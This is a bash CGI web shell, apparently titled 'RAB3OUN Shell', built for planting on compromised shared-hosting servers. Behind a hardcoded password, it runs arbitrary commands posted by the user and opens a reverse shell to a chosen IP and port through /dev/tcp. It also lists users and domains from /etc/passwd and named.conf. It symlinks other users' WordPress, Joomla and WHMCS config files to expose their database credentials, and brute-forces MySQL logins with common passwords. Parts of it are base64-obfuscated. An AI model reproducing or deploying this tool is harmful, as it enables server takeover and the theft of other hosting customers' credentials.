#!/bin/bash -i

#
password="123456"


function cgi_get_POST_vars()
{
    # check content type
    [ "${CONTENT_TYPE}" != "application/x-www-form-urlencoded" ] && \
	echo "Warning: you should probably use MIME type "\
	     "application/x-www-form-urlencoded!" 1>&2
    # save POST variables (only first time this is called)
    [ -z "$QUERY_STRING_POST" \
      -a "$REQUEST_METHOD" = "POST" -a ! -z "$CONTENT_LENGTH" ] && \
	read -n $CONTENT_LENGTH QUERY_STRING_POST
    return
}


function cgi_decodevar()
{
    [ $# -ne 1 ] && return
    local v t h
    
    t="${1//+/ }%%"
    while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
	v="${v}${t%%\%*}" 
	t="${t#*%}"       
	
	if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
	    h=${t:0:2} 
	    t="${t:2}" 
	    v="${v}"`echo -e \\\\x${h}` 
	fi
    done
    
    echo "${v}"
    return
}


function cgi_getvars()
{
    [ $# -lt 2 ] && return
    local q p k v s
    # get query
    case $1 in
	GET)
	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
	    ;;
	POST)
	    cgi_get_POST_vars
	    [ ! -z "${QUERY_STRING_POST}" ] && q="${QUERY_STRING_POST}&"
	    ;;
	BOTH)
	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
	    cgi_get_POST_vars
	    [ ! -z "${QUERY_STRING_POST}" ] && q="${q}${QUERY_STRING_POST}&"
	    ;;
    esac
    shift
    s=" $* "
    # parse the query data
    while [ ! -z "$q" ]; do
	p="${q%%&*}"  # get first part of query string
	k="${p%%=*}"  # get the key (variable name) from it
	v="${p#*=}"   # get the value from it
	q="${q#$p&*}" # strip first part from query string
	# decode and evaluate var if requested
	[ "$1" = "ALL" -o "${s/ $k /}" != "$s" ] && \
	    eval "$k=\"`cgi_decodevar \"$v\"`\""
    done
    return
}

# register all GET and POST variables
cgi_getvars BOTH ALL

pass="SAVEDPWD=$password"
passv=`echo $HTTP_COOKIE | awk '$pass|'  -f0`

if [ $cc2 -eq 4 ] ; then
clear
echo -e "Set-Cookie: SAVEDPWD=;\nContent-type: text/html\n\n"
echo '<meta http-equiv="refresh" content="0;">'
exit
else

if [ -n "$xx"  ] ; then
echo -e "Set-Cookie: SAVEDPWD=$xx;\nContent-type: text/html\n\n"
echo '<meta http-equiv="refresh" content="0;">'
else
echo -e "Content-type: text/html\n\n"
fi

fi
echo 'PGh0bWw+PHRpdGxlPlJBQjNPVU4gU2hlbGw8L3RpdGxlPg0KPGhlYWQ+DQo8c3R5bGU+DQoNCmJvZHkNCnsNCgliYWNrZ3JvdW5kOiAjMzMzOw0KCWNvbG9yOiAjRjVGNUY1Ow0KDQoJcGFkZGluZzogMTBweDsNCg0KfQ0KDQoNCmE6bGluaywgYm9keV9hbGluaw0Kew0KCWNvbG9yOiAjRkY5OTMzOw0KCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCn0NCmE6dmlzaXRlZCwgYm9keV9hdmlzaXRlZA0Kew0KCWNvbG9yOiAjRkY5OTMzOw0KCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCn0NCmE6aG92ZXIsIGE6YWN0aXZlLCBib2R5X2Fob3Zlcg0Kew0KCWNvbG9yOiAjRkZGRkZGOw0KCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCn0NCg0KdGV4dGFyZWENCnsNCglib3JkZXI6IDFweCBzb2xpZDsNCgljdXJzb3I6IGRlZmF1bHQ7DQoJDQoJYmFja2dyb3VuZDogIzAwMDsNCgljb2xvcjogI2ZmZmZmZjsNCmJvcmRlcjoxcHggc29saWQgI2ExYTFhMTsNCnBhZGRpbmc6NXB4IDIwcHg7IA0KYm9yZGVyLXJhZGl1czoyNXB4Ow0KLW1vei1ib3JkZXItcmFkaXVzOjI1cHg7IC8qIEZpcmVmb3ggMy42IGFuZCBlYXJsaWVyICovDQoNCn0NCg0KaW5wdXQNCnsNCglib3JkZXI6IDFweCBzb2xpZDsNCgljdXJzb3I6IGRlZmF1bHQ7DQoJb3ZlcmZsb3c6IGhpZGRlbjsNCgliYWNrZ3JvdW5kOiAjMDAwOw0KCWNvbG9yOiAjZmZmZmZmOw0KYm9yZGVyOjFweCBzb2xpZCAjYTFhMWExOw0KcGFkZGluZzo1cHggMjBweDsgDQpib3JkZXItcmFkaXVzOjI1cHg7DQotbW96LWJvcmRlci1yYWRpdXM6MjVweDsgLyogRmlyZWZveCAzLjYgYW5kIGVhcmxpZXIgKi8NCg0KfQ0KaW5wdXQuYnV0dG9uIHsNCmZvbnQtZmFtaWx5OiBDb3VyaWVyIE5ldzsNCmNvbG9yOiAjZmZmZmZmOw0KZm9udC1zaXplOiAxNnB4Ow0KcGFkZGluZzogMTBweDsNCnRleHQtZGVjb3JhdGlvbjogbm9uZTsNCi13ZWJraXQtYm9yZGVyLXJhZGl1czogOHB4Ow0KLW1vei1ib3JkZXItcmFkaXVzOiA4cHg7DQotd2Via2l0LWJveC1zaGFkb3c6IDBweCAxcHggM3B4ICNhYmFiYWI7DQotbW96LWJveC1zaGFkb3c6IDBweCAxcHggM3B4ICNhYmFiYWI7DQp0ZXh0LXNoYWRvdzogMXB4IDFweCAzcHggIzY2NjY2NjsNCmJvcmRlcjogc29saWQgI2RlZGJkZSAxcHg7DQpiYWNrZ3JvdW5kOiAjOTA5MDkwIDsNCn0NCi5idXR0b246aG92ZXIgew0KYmFja2dyb3VuZDogI0IwQjBCMDsNCn0NCg0KIGRpdi5ib3gNCnsNCmNvbG9yOiAjMzMzOw0KYm9yZGVyOjNweCBzb2xpZCAjYTFhMWExOw0KcGFkZGluZzoxMHB4IDQwcHg7IA0KYmFja2dyb3VuZDojZThlOGU4Ow0Kd2lkdGg6OTQlOw0KYm9yZGVyLXJhZGl1czoyNXB4Ow0KLW1vei1ib3JkZXItcmFkaXVzOjI1cHg7IC8qIEZpcmVmb3ggMy42IGFuZCBlYXJsaWVyICovDQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQo8Y2VudGVyPg0KPHByZT4NCi5fX19fX18gICAgICAgICAgX19fICAgICAgLl9fX19fXyAgICBfX19fICAgICBfX19fX18gICAgX18gICAgX18gIC5fXyAgIF9fLiAgICAgICAgIF9fX19fX18uIF9fICAgIF9fICAgX19fX19fXyAgX18gICAgICAgX18gICAgICANCnwgICBfICBcICAgICAgICAvICAgXCAgICAgfCAgIF8gIFwgIHxfX18gXCAgIC8gIF9fICBcICB8ICB8ICB8ICB8IHwgIFwgfCAgfCAgICAgICAgLyAgICAgICB8fCAgfCAgfCAgfCB8ICAgX19fX3x8ICB8ICAgICB8ICB8ICAgICANCnwgIHxfKSAgfCAgICAgIC8gIF4gIFwgICAgfCAgfF8pICB8ICAgX18pIHwgfCAgfCAgfCAgfCB8ICB8ICB8ICB8IHwgICBcfCAgfCAgICAgICB8ICAgKC0tLS1gfCAgfF9ffCAgfCB8ICB8X18gICB8ICB8ICAgICB8ICB8ICAgICANCnwgICAgICAvICAgICAgLyAgL19cICBcICAgfCAgIF8gIDwgICB8X18gPCAgfCAgfCAgfCAgfCB8ICB8ICB8ICB8IHwgIC4gYCAgfCAgICAgICAgXCAgIFwgICAgfCAgIF9fICAgfCB8ICAgX198ICB8ICB8ICAgICB8ICB8ICAgICANCnwgIHxcICBcLS0tLS4vICBfX19fXyAgXCAgfCAgfF8pICB8ICBfX18pIHwgfCAgYC0tICAgfCB8ICBgLS0gICB8IHwgIHxcICAgfCAgICAuLS0tLSkgICB8ICAgfCAgfCAgfCAgfCB8ICB8X19fXyB8ICBgLS0tLS58ICBgLS0tLS4NCnwgX3wgYC5fX19fXy9fXy8gICAgIFxfX1wgfF9fX19fXy8gIHxfX19fLyAgIFxfX19fX18vICAgXF9fX19fXy8gIHxfX3wgXF9ffCAgICB8X19fX19fXy8gICAgfF9ffCAgfF9ffCB8X19fX19fX3x8X19fX19fX3x8X19fX19fX3wNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCg0KPC9wcmU+DQoNCjxkaXYgYWxpZ249ImNlbnRlciI+' | base64 -d

 function login()
{
echo 'RW50ZXIgcGFzc3dvcmQ8YnI+DQo8YnI+PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+DQoJDQoJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+DQoJPGRpdiBhbGlnbj0iY2VudGVyIj48dGFibGUgYm9yZGVyPSIwIiB3aWR0aD0iMTIwIiBpZD0idGFibGUxIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiPjx0cj48dGQgPg0KPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJ4eCIgc2l6ZT0iMTAwIiB2YWx1ZT0iIi8+DQo8L3RkPjx0ZD48aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJidXR0b24xIiB2YWx1ZT0iU2VuZCIgLz48L3RkPjwvdHI+PC90YWJsZT48L2Rpdj48L2Zvcm0+PGJyPjxicj4NCjxicj48YnI+PGhyPg0KPGNlbnRlcj5Db2RlZCBieSBSYWIzb3VuPGJyPiBHcmVldHMgdG8gQWh3YWsyMDAwPC9jZW50ZXI+' | base64 -d

  return

	}
	



    echo "$HTTP_COOKIE" | grep -qi "$pass"
    if [ $? == 0 ]
    then
    echo ""
    else
login
exit
    fi
	

echo 'PHRhYmxlIGJvcmRlcj0wPjx0cj48dGQ+PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+IA0KPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+IA0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgkJPGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0iYnV0dG9uIiB2YWx1ZT0iICAgSG9tZSAgICAiIC8+DQoJPC9mb3JtPg0KCTwvdGQ+PHRkPg0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVlPSIxIiAgLz4gCTxpbnB1dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiIG5hbWU9ImJ1dHRvbiIgdmFsdWU9IiAgIFNob3cgVXNlciAgICAiIC8+DQoJPC9mb3JtPg0KPC90ZD4NCjx0ZD4NCjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCQ0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImNjMiIgdmFsdWU9IjIiICAvPg0KCQk8aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0ic3VibWl0IiBuYW1lPSJidXR0b24iIHZhbHVlPSIgU2hvdyAgIERvbWFpbnMgIiAvPg0KCTwvZm9ybT4NCjwvdGQ+DQo8dGQ+DQo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgkNCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVlPSIzIiAgLz4NCgkNCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV0dG9uIiBuYW1lPSJidXR0b24iIHZhbHVlPSJDcmVhdCAgLi4vc3ltbGluayIgLz4NCgk8L2Zvcm0+DQo8L3RkPg0KDQo8dGQ+DQo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgkNCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVlPSI1IiAgLz4NCgkNCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV0dG9uIiBuYW1lPSJidXR0b24iIHZhbHVlPSJDcGFuZWwiIC8+DQoJPC9mb3JtPg0KPC90ZD4NCg0KPHRkPg0KPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+DQoJDQoJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2MyIiB2YWx1ZT0iNyIgIC8+DQoJDQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ1dHRvbiIgbmFtZT0iYnV0dG9uIiB2YWx1ZT0iQkFDSy1DT05ORUNUIiAvPg0KCTwvZm9ybT4NCjwvdGQ+DQo8L3RyPjwvdGFibGU+DQogDQo8L2Rpdj4NCg0KPC9jZW50ZXI+' | base64 -d
if [ $cc2 -eq 7 ] ; then
echo '<br><form method="post" action="">
	
	<form method="post" action="">
	<div align="center">'
echo 'IP <input type="text" name="bip" size="50" value="';echo $REMOTE_ADDR;echo '"/><br>
Port <input type="text" name="bport" size="50" value="443"/></form><br><br>
<input type="hidden" name="cc2" value="8"  /><br>
<input type="submit" class="button" name="button" value="CONNECT" />'
echo "<br><br><hr><center>"
fi
if [ $cc2 -eq 8 ] ; then
bash -i >& /dev/tcp/$bip/$bport 0>&1
fi
if [ $cc2 -eq 6 ] ; then
echo '<pre>'



arr1=$(echo $listu | tr "\r" "\n")
arr2=$(echo $listp | tr "\r" "\n")
echo "<table border='0' width='100%'><tr><td align='center'><div class='box' align='left'><xmp>"
for x in $arr1
do
for y in $arr2
do
mysql -u$x -p$y  ;

if [ $? -eq 0 ] ; then
echo "Found Cpanel User $x Password ($y)"
fi

done
done
echo "</xmp></div></pre></td></tr></table>"
fi
if [ $cc2 -eq 5 ] ; then
echo '<form method="post" action="">
	<center> 
	<form method="post" action="">
Users
<br>
<textarea name="listu" cols="50" rows="15">'
eval `echo Y2F0IC9ldGMvcGFzc3dkIHxncmVwIC9ob21lIHxjdXQgLWQiOiIgLWYxIA== | base64 -d`;echo '</textarea>
<br>
Password
<br>
<textarea name="listp" cols="50" rows="15">123
1234
12345
123456
1234567
123456789
1234567890
123123
123321</textarea>

	<input type="hidden" name="cc2" value="6"  />
	<br>
	<br>
	<input type="submit" class="button" name="button" value="Send" />
	</form>
	<center>
'

fi





if [ $cc2 -eq 1 ] ; then
echo '<div align="center">'
echo "<xmp>"
eval `echo Y2F0IC9ldGMvcGFzc3dkIHxncmVwIC9ob21lIHxjdXQgLWQiOiIgLWYxIA== | base64 -d`
echo "</xmp>"
echo "</div>"
fi

if [ $cc2 -eq 2 ] ; then
echo "<br><center><table border='1' width='45%' cellspacing='0' bordercolor='#a3a3a3' cellpadding='0' align='center'><tr><td bgcolor='#000000' align='center'>Domain</td><td align='center' bgcolor='#000000'>User</td></tr>"

for i in `cat /etc/named.conf | uniq |grep '^zone' |grep -v '"."' |grep -v '"0.0.127.in-addr.arpa"' |cut -d ' ' -f 2  |cut -d '"' -f 2| sort | uniq `; do echo "<td align='center'>$i</td><td align='center'>" ; ls -dl /etc/valiases/$i |cut -d ' ' -f 3 ; echo "</td></tr>"; done

echo "</table></center><br>"
fi

if [ $cc2 -eq 3 ] ; then
echo "<xmp>"
mkdir ../sym
 echo Options Indexes FollowSymLinks > ../sym/.htaccess 
 echo  DirectoryIndex ssssss.htm >> ../sym/.htaccess 
 echo  AddType txt .php >> ../sym/.htaccess 
 echo  AddHandler txt .php >> ../sym/.htaccess 
 echo   AddType txt .html >> ../sym/.htaccess 
 echo  AddHandler txt .html >> ../sym/.htaccess 
 echo  Options all >> ../sym/.htaccess 
 echo  Options >> ../sym/.htaccess 
 echo  Options >> ../sym/.htaccess 
 echo 'ReadmeName r.txt' >> ../sym/.htaccess
 echo 'Q29kZWQgYnkgUkFCM09VTiA7KQ=='| base64 -d > ../sym/r.txt
for i in `cd /etc ;cat passwd |grep /home |cut -d":" -f1` ; do
eval "ln -s /home/$i/public_html/ ../sym/0-$i.txt" ;
eval "ln -s /home/$i/public_html/clientarea/configuration.php ../sym/$i-clientarea.txt";
eval "ln -s /home/$i/public_html/clients/configuration.php ../sym/$i-client.txt";
eval "ln -s /home/$i/public_html/configuration.php ../sym/$i-whmcsorjoomla.txt";
eval "ln -s /home/$i/public_html/billing/configuration.php ../sym/$i-billing.txt";
eval "ln -s /home/$i/public_html/billings/configuration.php ../sym/$i-billings.txt";
eval "ln -s /home/$i/public_html/whmcs/configuration.php ../sym/$i-whmcs2.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../sym/$i-whmcs3.txt";
eval "ln -s /home/$i/public_html/my/configuration.php ../sym/$i-whmcs4.txt";
eval "ln -s /home/$i/public_html/whm/configuration.php ../sym/$i-whm.txt";
eval "ln -s /home/$i/public_html/whmc/configuration.php ../sym/$i-whmc.txt";
eval "ln -s /home/$i/public_html/support/configuration.php ../sym/$i-support.txt";
eval "ln -s /home/$i/public_html/supports/configuration.php ../sym/$i-supports.txt";
eval "ln -s /home/$i/public_html/vb/includes/config.php ../sym/$i-vb.txt";
eval "ln -s /home/$i/public_html/includes/config.php ../sym/$i-vb2.txt";
eval "ln -s /home/$i/public_html/config.php ../sym/$i-2.txt";
eval "ln -s /home/$i/public_html/forum/includes/config.php ../sym/$i-forum.txt";
eval "ln -s /home/$i/public_html/forums/includes/config.php ../sym/$i-forums.txt";
eval "ln -s /home/$i/public_html/admin/conf.php ../sym/$i-5.txt";
eval "ln -s /home/$i/public_html/admin/config.php ../sym/$i-4.txt";
eval "ln -s /home/$i/public_html/wp-config.php ../sym/$i-wordpress.txt";
eval "ln -s /home/$i/public_html/blog/wp-config.php ../sym/$i-wordpress2.txt";
eval "ln -s /home/$i/public_html/conf_global.php ../sym/$i-6.txt";
eval "ln -s /home/$i/public_html/include/db.php ../sym/$i-7.txt";
eval "ln -s /home/$i/public_html/connect.php ../sym/$i-8.txt";
eval "ln -s /home/$i/public_html/mk_conf.php ../sym/$i-9.txt";
eval "ln -s /home/$i/public_html/joomla/configuration.php ../sym/$i-joomla.txt";
eval "ln -s /home/$i/public_html/web/configuration.php ../sym/$i-joomla2.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../sym/$i-joomla2.txt";
eval "ln -s /home/$i/public_html/include/config.php ../sym/$i-10.txt";
done
echo 'PC94bXA+PGRpdiBhbGlnbj0nY2VudGVyJz48YnI+IFN5bUxpbmtzIDxhIHRhcmdldD0nX2JsYW5rJyBocmVmPScuLi9zeW0nPkNsaWNrIGhlcmU8L2E+IDwvZGl2Pg==' | base64 -d
fi
if [ -n "$cc"  ] ; then
echo "<table border='0' width='100%'><tr><td align='center'><div class='box' align='left'><xmp>"
cd $d 
eval $cc
echo $?
echo '</xmp></div></pre></td></tr></table><br><br>'
fi
echo 'PGJyPjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCQ0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCTxkaXYgYWxpZ249ImNlbnRlciI+PHRhYmxlIGJvcmRlcj0iMCIgd2lkdGg9IjEyMCIgaWQ9InRhYmxlMSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIwIj48dHI+PHRkIHdpZHRoPSI3MTIiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjYyIgc2l6ZT0iMTAwIiAgLz48L3RkPjx0ZD48L3RkPjwvdHI+PHRyPjx0ZCB3aWR0aD0iNzEyIj4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJkIiBzaXplPSIxMDAiIHZhbHVlPSI=' | base64 -d
pwd  
echo 'Ii8+DQo8L3RkPjx0ZD48aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJidXR0b24xIiB2YWx1ZT0iU2VuZCIgLz48L3RkPjwvdHI+PC90YWJsZT48L2Rpdj48L2Zvcm0+PGJyPjxicj4NCjxicj48YnI+PGhyPjxjZW50ZXI+DQo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgkNCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVlPSI0IiAgLz4NCgkNCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV0dG9uIiBuYW1lPSJidXR0b24iIHZhbHVlPSJMb2dvdXQiIC8+DQoJPC9mb3JtPg0KPGNlbnRlcj5Db2RlZCBieSBSYWIzb3VuPGJyPiBHcmVldHMgdG8gQWh3YWsyMDAwPC9jZW50ZXI+' | base64 -d